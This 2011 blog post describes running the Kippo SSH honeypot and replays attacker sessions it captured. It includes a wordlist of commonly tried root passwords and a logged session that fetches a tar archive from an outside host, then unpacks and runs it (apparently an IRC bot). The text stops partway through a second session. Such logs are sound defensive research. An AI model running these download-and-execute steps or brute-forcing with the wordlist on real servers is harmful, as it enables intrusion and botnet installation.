<!DOCTYPE html>
<head>
	<meta charset="utf-8" />
	<meta name="viewport" content="width=device-width" />

	<title>Running A SSH Honeypot With Kippo: Let’s Catch Some Script Kiddies</title>

	<link rel="stylesheet" href="//blog.macuyiko.com/theme/css/normalize.css" />
	<link rel="stylesheet" href="//blog.macuyiko.com/theme/css/foundation.min.css" />
	<link rel="stylesheet" href="//blog.macuyiko.com/theme/css/style.css" />
	<link rel="stylesheet" href="//blog.macuyiko.com/theme/css/pygments.css" />	
	<script src="//blog.macuyiko.com/theme/js/jquery-3.4.1.min.js"></script>
	<link href="https://fonts.googleapis.com/css?family=Bitter:400,700|Source+Code+Pro&display=swap" rel="stylesheet">

	<script type="text/javascript">
	var waitForFinalEvent = (function () {
		var timers = {};
		return function (callback, ms, uniqueId) {
			if (!uniqueId) uniqueId = "_";
			if (timers[uniqueId]) clearTimeout (timers[uniqueId]);
			timers[uniqueId] = setTimeout(callback, ms);
		};
	})();
	var insertCaptions = function() {
		$('#articlecontainer .caption').remove();
		var width = $(window).width();
		var onmobile = width < 1400; //>
		var capclass = onmobile ? 'caption-below' : 'caption-aside';
		$.each($('#articlecontainer img'), function(index, value) {
			if ($(value).attr('alt') != undefined) {
				var elem = $('<div class="caption '+capclass+'">'+$(value).attr('alt')+'</div>');
				if (onmobile) elem.insertAfter(value);
				else elem.insertBefore(value);
			}
		});
	};
	$(function() {
		$(window).resize(function () {
			waitForFinalEvent(function(){
				insertCaptions();
			}, 500, "window.resize");
		});
		insertCaptions();
	});
	</script>
	<script type="text/javascript">
		var _gaq = _gaq || [];
		_gaq.push(['_setAccount', 'UA-60406-11']);
		_gaq.push(['_trackPageview']);

		(function() {
			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
		})();
	</script>
</head>

<body>

<nav>
	<div class="top-bar large-12 columns">
		<h1><a href="//blog.macuyiko.com/">Bed Against The Wall</a></h1>
	</div>
</nav>


<div class="row contentwrapper">
	<div class="row">
<div id="articlecontainer" class="large-9 columns large-centered">
	<article>
		<header>
			<div class="article-info">Thu 10 March 2011, by Seppe "Macuyiko" vanden Broucke</div>
			<div class="article-title"><a href="//blog.macuyiko.com/post/2011/running-a-ssh-honeypot-with-kippo-lets-catch-some-script-kiddies.html" rel="bookmark"
			title="Permalink to Running A SSH Honeypot With Kippo: Let’s Catch Some Script Kiddies">Running A <span class="caps">SSH</span> Honeypot With Kippo: Let&#8217;s Catch Some Script&nbsp;Kiddies</a></div>
		</header>
	
	    <h1>Introduction</h1>
<p>While exploring <a href="http://www.fail2ban.org/">Fail2Ban</a> during one of my <a href="http://blog.macuyiko.com/2011/01/slowloris-and-mitigations-for-apache.html">previous posts</a>, it amazed me how many break-in attempts I received, trying to brute force passwords on the <span class="caps">SSH</span> daemon. To recap, Fail2Ban does&nbsp;this:</p>
<blockquote>
<p>Fail2ban scans log files like /var/log/pwdfail or /var/log/apache/error_log and bans <span class="caps">IP</span> that makes too many password failures. It updates firewall rules to reject the <span class="caps">IP</span>&nbsp;address.</p>
</blockquote>
<p>There are many articles (<a href="http://thinkhole.org/wp/2006/10/30/five-steps-to-a-more-secure-ssh/">this</a> is one of them) on the web which describe how you can harden your <span class="caps">SSH</span> server, like preventing root logins, to give an example. After getting one Fail2Ban warning after another, I decided to also move my <span class="caps">SSH</span> server to another port. And lo and behold, the attacks stopped almost completely. This is an example of security through obscurity, of course, but it shows that most of the attacks are performed by bots or script kiddies who don&#8217;t look further than port 22, so why not implement this simple&nbsp;chance.</p>
<p>Of course, now port 22 was free to do something&nbsp;else&#8230;</p>
<h1>Enter&nbsp;Kippo</h1>
<p>Around this time (a few months ago), I also came across a program called <a href="http://code.google.com/p/kippo/">Kippo</a>:</p>
<blockquote>
<p>Kippo is a medium interaction <span class="caps">SSH</span> honeypot designed to log brute force attacks and, most importantly, the entire shell interaction performed by the&nbsp;attacker.</p>
</blockquote>
<p>Kippo is written in Python and pretty easy to install (the required dependencies are all listed on the homepage). The only thing which needs a bit of setting up is getting Kippo to listen to port 22 (we want our honeypot to catch as much as possible). <a href="http://code.google.com/p/kippo/wiki/MakingKippoReachable">This wiki page</a> describes how to do just&nbsp;that.</p>
<p>Kippo does not need much <a href="http://code.google.com/p/kippo/wiki/KippoOnLinux">setting up</a>, and comes with a lot of Linux commands re-implemented (like wget, adduser, apt-get). The most important thing to do is to take look at <code>kippo.cfg</code> and to create the simulated file system using <code>utils/createfs.py</code>. You can also easily add other commands if you&#8217;re know what you&#8217;re doing (take a look in <code>txtcmds/</code> and <code>kippo/commands/</code>).</p>
<p>After waiting for a week, I examined the logs to find out which passwords were used to try to login at the honeypot. By default, Kippo only comes with one root password it will accept (&#8220;123456&#8221;), but you can use the <code>utils/passdb.py</code> script to add more. I added these most commonly tried&nbsp;passwords:</p>
<ul>
<li>aditzul92</li>
<li>admin1</li>
<li>enter</li>
<li>fuckoff</li>
<li>god</li>
<li>lacramioara</li>
<li>letmein</li>
<li>linux</li>
<li>love</li>
<li>passwd</li>
<li>r00t</li>
<li>rootroot</li>
<li>secret</li>
<li>sex</li>
<li>snickhacklol123</li>
<li>test</li>
<li>070790</li>
<li>123456</li>
<li>1q2wazsx</li>
<li>administrator</li>
<li>dragon</li>
<li>fuck</li>
<li>manager</li>
<li>monkey</li>
<li>p0p0c@t3p3tldiej</li>
<li>password</li>
<li>q1w2e3r4</li>
<li>root1</li>
<li>swordfish</li>
</ul>
<p>It&#8217;s well known that brute force programs use so called wordlists which contain the most common passwords to try and break in into a server. If you notice that one of your used passwords is present in the list above, I would strongly suggest to change it. Then, I&nbsp;waited&#8230;</p>
<h1>A few months&nbsp;later</h1>
<p>When looking at my logs now, I&#8217;ve had thousands of break-in attempts, hundreds of which &#8220;succeeded&#8221;. The interesting thing about Kippo is that it actually logs the shell session of the hacker. These shell sessions can be divided into three&nbsp;categories:</p>
<ol>
<li>People who immediately leave once they&#8217;re logged in, probably to come back later or just take note that this server is indeed&nbsp;available.</li>
<li>People who do some basic fingerprinting of the server, using <code>w</code>, <code>/proc/cpuinfo</code>, <code>uptime</code> and <code>uname -a</code> to figure out the basics of the server. Most hackers also used <code>wget</code> to download a large file to test the download rate of the server. Funnily enough, this was almost always the Windows 2000 <span class="caps">SP3</span>. Probably because it&#8217;s (a) a large file and (b) hosted by a server you know is fast (Microsoft) and (c) is one of the few files on Microsoft&#8217;s website which is still&nbsp;hotlinkable.</li>
<li>People who performed some fingerprinting and proceeded to download and extract malware. Here Kippo intercepted the attempts to run executables and showed some bogus error messages, after which the hackers&nbsp;disconnected.</li>
</ol>
<p>Viewing the logs allows for some interesting&nbsp;observations:</p>
<ul>
<li>Most of the attempts aren&#8217;t thorough. Most hackers quickly move on when an attempt seems to&nbsp;fail.</li>
<li>The tools used have been repacked and rewritten multiple times. Most of the tools are outdated, contain leftover files from previous installations or attempts, or contain weak attempts at automation shell scripts (with even sillier <span class="caps">ASCII</span>&nbsp;art).</li>
<li>The main reasons for hacking a server seems to be: (a) installing tools to hack more servers, (b) installing hidden web servers, (c) installing <span class="caps">IRC</span> daemons or bouncers, (d) installing <span class="caps">IRC</span> bots. Surprisingly, almost none of the hackers tried to completely nuke the&nbsp;system.</li>
<li>A few hackers spotted that a honeypot was in place. Most did not, despite the fact that Kippo is sometimes very blatant about this fact, by taunting with fake error&nbsp;messages.</li>
<li>It seems that the hackers (I actually mean &#8220;script kiddies&#8221; whenever I say &#8220;hackers&#8221;) are following some kind of memorized script. Most of the attempts used to exact same fingerprinting and tried to execute the exact same tools. It makes one wonder if there&#8217;s a &#8220;<span class="caps">SSH</span> hacking school&#8221; out there somewhere. More realistically speaking, there probably is a &#8220;hacking tutorial&#8221; on a forum somewhere showing which commands you have to&nbsp;execute.</li>
</ul>
<h1>A look at some&nbsp;attempts</h1>
<p>Let&#8217;s look at some of the shell sessions, shall we? I wanted to show an exact replay of the terminal sessions (like the demos on the <a href="http://code.google.com/p/kippo/">Kippo homepage</a>, but this proved to be too difficult. (Kippo&#8217;s log files are not easily read, and while I did code up a conversion tool and the basics of a Javascript replaying script, it under performed on browsers other than Chrome, and I decided it was not worth further&nbsp;effort).</p>
<h2>First&nbsp;example</h2>
<p>This attempt shows some of the basic fingerprinting performed by the hackers, and Kippo&#8217;s faked response. Afterwards, the hacker tries to download an <span class="caps">IRC</span> bot. Kippo taunts with an &#8220;O <span class="caps">RLY</span>&#8221;&nbsp;message.</p>
<div class="highlight"><pre><span></span><span class="nv">server</span>:<span class="o">~</span># <span class="nv">w</span>
 <span class="mi">23</span>:<span class="mi">40</span>:<span class="mi">45</span> <span class="nv">up</span> <span class="mi">14</span> <span class="nv">days</span>,  <span class="mi">3</span>:<span class="mi">53</span>,  <span class="mi">1</span> <span class="nv">user</span>,  <span class="nv">load</span> <span class="nv">average</span>: <span class="mi">0</span>.<span class="mi">08</span>, <span class="mi">0</span>.<span class="mi">02</span>, <span class="mi">0</span>.<span class="mi">01</span>
<span class="nv">USER</span>     <span class="nv">TTY</span>      <span class="nv">FROM</span>              <span class="nv">LOGIN</span>@   <span class="nv">IDLE</span>   <span class="nv">JCPU</span>   <span class="nv">PCPU</span> <span class="nv">WHAT</span>
<span class="nv">root</span>     <span class="nv">pts</span><span class="o">/</span><span class="mi">0</span>    <span class="mi">188</span>.<span class="mi">131</span>.<span class="mi">103</span>.<span class="mi">31</span>    <span class="mi">23</span>:<span class="mi">33</span>    <span class="mi">0</span>.<span class="mi">00</span><span class="nv">s</span>  <span class="mi">0</span>.<span class="mi">00</span><span class="nv">s</span>  <span class="mi">0</span>.<span class="mi">00</span><span class="nv">s</span> <span class="nv">w</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="k">uptime</span>
 <span class="mi">23</span>:<span class="mi">30</span>:<span class="mi">42</span> <span class="nv">up</span> <span class="mi">14</span> <span class="nv">days</span>,  <span class="mi">3</span>:<span class="mi">53</span>,  <span class="mi">0</span> <span class="nv">users</span>,  <span class="nv">load</span> <span class="nv">average</span>: <span class="mi">0</span>.<span class="mi">08</span>, <span class="mi">0</span>.<span class="mi">02</span>, <span class="mi">0</span>.<span class="mi">01</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">cat</span> <span class="o">/</span><span class="nv">proc</span><span class="o">/</span><span class="nv">cpuinfo</span>
<span class="nv">processor</span>    : <span class="mi">0</span>
<span class="nv">vendor_id</span>    : <span class="nv">GenuineIntel</span>
<span class="nv">cpu</span> <span class="nv">family</span>    : <span class="mi">6</span>
<span class="nv">model</span>        : <span class="mi">23</span>
<span class="nv">model</span> <span class="nv">name</span>    : <span class="nv">Intel</span><span class="ss">(</span><span class="nv">R</span><span class="ss">)</span> <span class="nv">Core</span><span class="ss">(</span><span class="nv">TM</span><span class="ss">)</span><span class="mi">2</span> <span class="nv">Duo</span> <span class="nv">CPU</span>     <span class="nv">E8200</span>  @ <span class="mi">2</span>.<span class="mi">66</span><span class="nv">GHz</span>
<span class="nv">stepping</span>    : <span class="mi">6</span>
<span class="nv">cpu</span> <span class="nv">MHz</span>        : <span class="mi">2133</span>.<span class="mi">305</span>
<span class="nv">cache</span> <span class="nv">size</span>    : <span class="mi">6144</span> <span class="nv">KB</span>
<span class="nv">physical</span> <span class="nv">id</span>    : <span class="mi">0</span>
<span class="nv">siblings</span>    : <span class="mi">2</span>
<span class="nv">core</span> <span class="nv">id</span>        : <span class="mi">0</span>
<span class="nv">cpu</span> <span class="nv">cores</span>    : <span class="mi">2</span>
<span class="nv">apicid</span>        : <span class="mi">0</span>
<span class="nv">initial</span> <span class="nv">apicid</span>    : <span class="mi">0</span>
<span class="nv">fpu</span>        : <span class="nv">yes</span>
<span class="nv">fpu_exception</span>    : <span class="nv">yes</span>
<span class="nv">cpuid</span> <span class="nv">level</span>    : <span class="mi">10</span>
<span class="nv">wp</span>        : <span class="nv">yes</span>
<span class="nv">flags</span>        : <span class="nv">fpu</span> <span class="nv">vme</span> <span class="nv">de</span> <span class="nv">pse</span> <span class="nv">tsc</span> <span class="nv">msr</span> <span class="nv">pae</span> <span class="nv">mce</span> <span class="nv">cx8</span> <span class="nv">apic</span> <span class="nv">sep</span> <span class="nv">mtrr</span> <span class="nv">pge</span> <span class="nv">mca</span> <span class="nv">cmov</span> <span class="nv">pat</span> <span class="nv">pse36</span> <span class="nv">clflush</span> <span class="nv">dts</span> <span class="nv">acpi</span> <span class="nv">mmx</span> <span class="nv">fxsr</span> <span class="nv">sse</span> <span class="nv">sse2</span> <span class="nv">ss</span> <span class="nv">ht</span> <span class="nv">tm</span> <span class="nv">pbe</span> <span class="nv">syscall</span> <span class="nv">nx</span> <span class="nv">lm</span> <span class="nv">constant_tsc</span> <span class="nv">arch_perfmon</span> <span class="nv">pebs</span> <span class="nv">bts</span> <span class="nv">rep_good</span> <span class="nv">pni</span> <span class="nv">monitor</span> <span class="nv">ds_cpl</span> <span class="nv">vmx</span> <span class="nv">smx</span> <span class="nv">est</span> <span class="nv">tm2</span> <span class="nv">ssse3</span> <span class="nv">cx16</span> <span class="nv">xtpr</span> <span class="nv">sse4_1</span> <span class="nv">lahf_lm</span>
<span class="nv">bogomips</span>    : <span class="mi">4270</span>.<span class="mi">03</span>
<span class="nv">clflush</span> <span class="nv">size</span>    : <span class="mi">64</span>
<span class="nv">cache_alignment</span>    : <span class="mi">64</span>
<span class="nv">address</span> <span class="nv">sizes</span>    : <span class="mi">36</span> <span class="nv">bits</span> <span class="nv">physical</span>, <span class="mi">48</span> <span class="nv">bits</span> <span class="nv">virtual</span>
<span class="nv">power</span> <span class="nv">management</span>:
<span class="nv">processor</span>    : <span class="mi">1</span>
<span class="nv">vendor_id</span>    : <span class="nv">GenuineIntel</span>
<span class="nv">cpu</span> <span class="nv">family</span>    : <span class="mi">6</span>
<span class="nv">model</span>        : <span class="mi">23</span>
<span class="nv">model</span> <span class="nv">name</span>    : <span class="nv">Intel</span><span class="ss">(</span><span class="nv">R</span><span class="ss">)</span> <span class="nv">Core</span><span class="ss">(</span><span class="nv">TM</span><span class="ss">)</span><span class="mi">2</span> <span class="nv">Duo</span> <span class="nv">CPU</span>     <span class="nv">E8200</span>  @ <span class="mi">2</span>.<span class="mi">66</span><span class="nv">GHz</span>
<span class="nv">stepping</span>    : <span class="mi">6</span>
<span class="nv">cpu</span> <span class="nv">MHz</span>        : <span class="mi">2133</span>.<span class="mi">305</span>
<span class="nv">cache</span> <span class="nv">size</span>    : <span class="mi">6144</span> <span class="nv">KB</span>
<span class="nv">physical</span> <span class="nv">id</span>    : <span class="mi">0</span>
<span class="nv">siblings</span>    : <span class="mi">2</span>
<span class="nv">core</span> <span class="nv">id</span>        : <span class="mi">1</span>
<span class="nv">cpu</span> <span class="nv">cores</span>    : <span class="mi">2</span>
<span class="nv">apicid</span>        : <span class="mi">1</span>
<span class="nv">initial</span> <span class="nv">apicid</span>    : <span class="mi">1</span>
<span class="nv">fpu</span>        : <span class="nv">yes</span>
<span class="nv">fpu_exception</span>    : <span class="nv">yes</span>
<span class="nv">cpuid</span> <span class="nv">level</span>    : <span class="mi">10</span>
<span class="nv">wp</span>        : <span class="nv">yes</span>
<span class="nv">flags</span>        : <span class="nv">fpu</span> <span class="nv">vme</span> <span class="nv">de</span> <span class="nv">pse</span> <span class="nv">tsc</span> <span class="nv">msr</span> <span class="nv">pae</span> <span class="nv">mce</span> <span class="nv">cx8</span> <span class="nv">apic</span> <span class="nv">sep</span> <span class="nv">mtrr</span> <span class="nv">pge</span> <span class="nv">mca</span> <span class="nv">cmov</span> <span class="nv">pat</span> <span class="nv">pse36</span> <span class="nv">clflush</span> <span class="nv">dts</span> <span class="nv">acpi</span> <span class="nv">mmx</span> <span class="nv">fxsr</span> <span class="nv">sse</span> <span class="nv">sse2</span> <span class="nv">ss</span> <span class="nv">ht</span> <span class="nv">tm</span> <span class="nv">pbe</span> <span class="nv">syscall</span> <span class="nv">nx</span> <span class="nv">lm</span> <span class="nv">constant_tsc</span> <span class="nv">arch_perfmon</span> <span class="nv">pebs</span> <span class="nv">bts</span> <span class="nv">rep_good</span> <span class="nv">pni</span> <span class="nv">monitor</span> <span class="nv">ds_cpl</span> <span class="nv">vmx</span> <span class="nv">smx</span> <span class="nv">est</span> <span class="nv">tm2</span> <span class="nv">ssse3</span> <span class="nv">cx16</span> <span class="nv">xtpr</span> <span class="nv">sse4_1</span> <span class="nv">lahf_lm</span>
<span class="nv">bogomips</span>    : <span class="mi">4266</span>.<span class="mi">61</span>
<span class="nv">clflush</span> <span class="nv">size</span>    : <span class="mi">64</span>
<span class="nv">cache_alignment</span>    : <span class="mi">64</span>
<span class="nv">address</span> <span class="nv">sizes</span>    : <span class="mi">36</span> <span class="nv">bits</span> <span class="nv">physical</span>, <span class="mi">48</span> <span class="nv">bits</span> <span class="nv">virtual</span>
<span class="nv">power</span> <span class="nv">management</span>:

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">uname</span> <span class="o">-</span><span class="nv">a</span>
<span class="nv">Linux</span> <span class="nv">server</span> <span class="mi">2</span>.<span class="mi">6</span>.<span class="mi">26</span><span class="o">-</span><span class="mi">2</span><span class="o">-</span><span class="mi">686</span> <span class="sc">#1</span> <span class="nv">SMP</span> <span class="nv">Wed</span> <span class="nv">Nov</span> <span class="mi">4</span> <span class="mi">20</span>:<span class="mi">45</span>:<span class="mi">37</span> <span class="nv">UTC</span> <span class="mi">2009</span> <span class="nv">i686</span> <span class="nv">GNU</span><span class="o">/</span><span class="nv">Linux</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">ls</span> <span class="o">-</span><span class="nv">a</span>
.         ..        .<span class="nv">debtags</span>  .<span class="nv">viminfo</span>  .<span class="nv">aptitude</span> .<span class="nv">profile</span>  .<span class="nv">bashrc</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">ps</span> <span class="nv">x</span>
  <span class="nv">PID</span> <span class="nv">TTY</span>          <span class="nv">TIME</span> <span class="nv">CMD</span>
 <span class="mi">5673</span> <span class="nv">pts</span><span class="o">/</span><span class="mi">0</span>    <span class="mi">00</span>:<span class="mi">00</span>:<span class="mi">00</span> <span class="nv">bash</span>
 <span class="mi">5677</span> <span class="nv">pts</span><span class="o">/</span><span class="mi">0</span>    <span class="mi">00</span>:<span class="mi">00</span>:<span class="mi">00</span> <span class="nv">ps</span> <span class="nv">x</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">wget</span> <span class="nv">http</span>:<span class="o">//</span><span class="nv">download</span>.<span class="nv">microsoft</span>.<span class="nv">com</span><span class="o">/</span><span class="nv">download</span><span class="o">/</span><span class="nv">win2000platform</span><span class="o">/</span><span class="nv">SP</span><span class="o">/</span><span class="nv">SP3</span><span class="o">/</span><span class="nv">NT5</span><span class="o">/</span><span class="nv">EN</span><span class="o">-</span><span class="nv">US</span><span class="o">/</span><span class="nv">W2Ksp3</span>.<span class="nv">exe</span>
<span class="o">--</span><span class="mi">2011</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">26</span> <span class="mi">23</span>:<span class="mi">31</span>:<span class="mi">12</span><span class="o">--</span>  <span class="nv">http</span>:<span class="o">//</span><span class="nv">download</span>.<span class="nv">microsoft</span>.<span class="nv">com</span><span class="o">/</span><span class="nv">download</span><span class="o">/</span><span class="nv">win2000platform</span><span class="o">/</span><span class="nv">SP</span><span class="o">/</span><span class="nv">SP3</span><span class="o">/</span><span class="nv">NT5</span><span class="o">/</span><span class="nv">EN</span><span class="o">-</span><span class="nv">US</span><span class="o">/</span><span class="nv">W2Ksp3</span>.<span class="nv">exe</span>
<span class="nv">Connecting</span> <span class="nv">to</span> <span class="nv">download</span>.<span class="nv">microsoft</span>.<span class="nv">com</span>:<span class="mi">80</span>... <span class="nv">connected</span>.
<span class="nv">HTTP</span> <span class="nv">request</span> <span class="nv">sent</span>, <span class="nv">awaiting</span> <span class="nv">response</span>... <span class="mi">200</span> <span class="nv">OK</span>
<span class="nv">Length</span>: <span class="mi">130978672</span> <span class="ss">(</span><span class="mi">124</span><span class="nv">M</span><span class="ss">)</span> [<span class="nv">application</span><span class="o">/</span><span class="nv">octet</span><span class="o">-</span><span class="nv">stream</span>]
<span class="nv">Saving</span> <span class="nv">to</span>: `<span class="nv">W2Ksp3</span>.<span class="nv">exe</span>
 <span class="mi">7</span><span class="o">%</span> [<span class="o">===&gt;</span>                                   ] <span class="mi">10</span>,<span class="mi">422</span>,<span class="mi">763</span>   <span class="mi">1731</span><span class="nv">K</span><span class="o">/</span><span class="nv">s</span>  <span class="nv">eta</span> <span class="mi">1</span><span class="nv">m</span> <span class="mi">9</span><span class="nv">s</span><span class="o">^</span><span class="nv">C</span>
<span class="mi">200</span> <span class="nv">OK</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">rm</span> <span class="o">-</span><span class="nv">rf</span> <span class="nv">W2Ksp3</span>.<span class="nv">exe</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">wget</span> <span class="nv">http</span>:<span class="o">//</span><span class="nv">eu</span><span class="o">-</span><span class="nv">ro</span>.<span class="nv">ca</span><span class="o">/</span><span class="nv">img</span>.<span class="nv">tar</span>
<span class="o">--</span><span class="mi">2011</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">26</span> <span class="mi">23</span>:<span class="mi">31</span>:<span class="mi">31</span><span class="o">--</span>  <span class="nv">http</span>:<span class="o">//</span><span class="nv">eu</span><span class="o">-</span><span class="nv">ro</span>.<span class="nv">ca</span><span class="o">/</span><span class="nv">img</span>.<span class="nv">tar</span>
<span class="nv">Connecting</span> <span class="nv">to</span> <span class="nv">eu</span><span class="o">-</span><span class="nv">ro</span>.<span class="nv">ca</span>:<span class="mi">80</span>... <span class="nv">connected</span>.
<span class="nv">HTTP</span> <span class="nv">request</span> <span class="nv">sent</span>, <span class="nv">awaiting</span> <span class="nv">response</span>... <span class="mi">200</span> <span class="nv">OK</span>
<span class="nv">Length</span>: <span class="mi">659886</span> <span class="ss">(</span><span class="mi">644</span><span class="nv">K</span><span class="ss">)</span> [<span class="nv">application</span><span class="o">/</span><span class="nv">x</span><span class="o">-</span><span class="nv">tar</span>]
<span class="nv">Saving</span> <span class="nv">to</span>: `<span class="nv">img</span>.<span class="nv">tar</span>
<span class="mi">100</span><span class="o">%</span>[<span class="o">======================================&gt;</span>] <span class="mi">659</span>,<span class="mi">886</span>      <span class="mi">219</span><span class="nv">K</span><span class="o">/</span><span class="nv">s</span>  <span class="nv">eta</span> <span class="mi">0</span><span class="nv">s</span>
<span class="mi">2011</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">26</span> <span class="mi">23</span>:<span class="mi">31</span>:<span class="mi">34</span> <span class="ss">(</span><span class="mi">219</span> <span class="nv">KB</span><span class="o">/</span><span class="nv">s</span><span class="ss">)</span> <span class="o">-</span> `<span class="nv">img</span>.<span class="nv">tar</span><span class="s1">&#39;</span><span class="s"> saved [659886/659886]</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">tar</span> <span class="nv">zxvf</span> <span class="nv">img</span>.<span class="nv">tar</span>
.<span class="nv">img</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">start</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">run</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">r</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rversions</span>.<span class="nv">e</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rtsay</span>.<span class="nv">e</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rsignoff</span>.<span class="nv">e</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rsay</span>.<span class="nv">e</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rpickup</span>.<span class="nv">e</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rnicks</span>.<span class="nv">e</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rkicks</span>.<span class="nv">e</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rinsult</span>.<span class="nv">e</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">raway</span>.<span class="nv">e</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">pico</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">m</span>.<span class="nv">help</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">inst</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">bash</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">autorun</span>
.<span class="nv">img</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">start</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">run</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">r</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rversions</span>.<span class="nv">e</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rtsay</span>.<span class="nv">e</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rsignoff</span>.<span class="nv">e</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rsay</span>.<span class="nv">e</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rpickup</span>.<span class="nv">e</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rnicks</span>.<span class="nv">e</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rkicks</span>.<span class="nv">e</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">rinsult</span>.<span class="nv">e</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">r</span><span class="o">/</span><span class="nv">raway</span>.<span class="nv">e</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">pico</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">m</span>.<span class="nv">help</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">inst</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">bash</span>
.<span class="nv">img</span><span class="o">/</span><span class="nv">autorun</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">cd</span> .<span class="nv">img</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">root</span><span class="o">/</span>.<span class="nv">img</span># <span class="nv">chmod</span> <span class="o">+</span><span class="nv">x</span> <span class="o">*</span>

<span class="nv">server</span>:<span class="o">/</span><span class="nv">root</span><span class="o">/</span>.<span class="nv">img</span># .<span class="o">/</span><span class="nv">start</span> <span class="o">+</span><span class="nv">s</span>
  <span class="nv">___</span>
 {<span class="nv">o</span>,<span class="nv">o</span>}
 <span class="o">|</span><span class="ss">)</span><span class="nv">__</span><span class="ss">)</span>
 <span class="o">-</span><span class="s2">&quot;</span><span class="s">-</span><span class="s2">&quot;</span><span class="o">-</span>
<span class="nv">O</span> <span class="nv">RLY</span>? <span class="nv">cd</span>
  <span class="nv">___</span>
 {<span class="nv">o</span>,<span class="nv">o</span>}
 <span class="o">|</span><span class="ss">)</span><span class="nv">__</span><span class="ss">)</span>
 <span class="o">-</span><span class="s2">&quot;</span><span class="s">-</span><span class="s2">&quot;</span><span class="o">-</span>
<span class="nv">O</span> <span class="nv">RLY</span>? <span class="nv">cd</span> ..
  <span class="nv">___</span>
 {<span class="nv">o</span>,<span class="nv">o</span>}
 <span class="o">|</span><span class="ss">)</span><span class="nv">__</span><span class="ss">)</span>
 <span class="o">-</span><span class="s2">&quot;</span><span class="s">-</span><span class="s2">&quot;</span><span class="o">-</span>
<span class="nv">O</span> <span class="nv">RLY</span>?
</pre></div>


<h2>Second&nbsp;example</h2>
<p>Another one (I&#8217;ve removed the fingerprinting from now on). Here, <code>ftp</code>, <code>apt-get</code> and <code>yum</code> are tried before settling with <code>wget</code>. Another interesting thing to see here is that the tool is actually stored in what &#8220;looks&#8221; like an image file: <code>scanmorf.jpg</code>. Changing the extension is a tactic often used to upload files to web servers who only perform some basic filename checks. In this case, <code>root-arhive.do.am</code> might be an innocent, hacked website. The <code>pscan</code> tool used here will return often and is used to scan <span class="caps">IP</span> blocks for open <span class="caps">SSH</span>&nbsp;servers.</p>
<div class="highlight"><pre><span></span><span class="nv">server</span>:<span class="o">~</span># <span class="nv">ftp</span> <span class="nv">zorro89</span>.<span class="nv">trei</span>.<span class="nv">ro</span>
<span class="nv">bash</span>: <span class="nv">ftp</span>: <span class="nv">command</span> <span class="nv">not</span> <span class="nv">found</span>

<span class="nv">server</span>:<span class="o">~</span># <span class="nv">apt</span><span class="o">-</span><span class="nv">get</span>
<span class="nv">E</span>: <span class="nv">Could</span> <span class="nv">not</span> <span class="nv">open</span> <span class="nv">lock</span> <span class="nv">file</span> <span class="o">/</span><span class="nv">var</span><span class="o">/</span><span class="nv">lib</span><span class="o">/</span><span class="nv">apt</span><span class="o">/</span><span class="nv">lists</span><span class="o">/</span><span class="nv">lock</span> <span class="o">-</span> <span class="nv">open</span> <span class="ss">(</span><span class="mi">13</span>: <span class="nv">Permission</span> <span class="nv">denied</span><span class="ss">)</span>
